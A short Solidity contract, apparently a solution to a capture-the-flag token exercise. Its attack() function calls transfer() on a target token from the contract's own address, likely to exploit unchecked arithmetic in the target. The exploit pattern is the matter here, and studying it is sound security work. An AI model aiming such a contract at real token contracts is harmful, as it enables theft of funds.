// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

interface IToken {
    function transfer(address _to, uint256 _value) external  returns (bool);
    function balanceOf(address _owner) external  view returns (uint256 balance);
}

contract TokenAttack {
    IToken token;
    

    constructor(address _token) {
      token = IToken(_token);
    }

    function attack(address account, uint256 _value) external{
        token.transfer(account, _value);
    }

    function balanceOf(address _owner) external  view returns (uint256 balance) {
        balance = token.balanceOf(_owner);
    }
}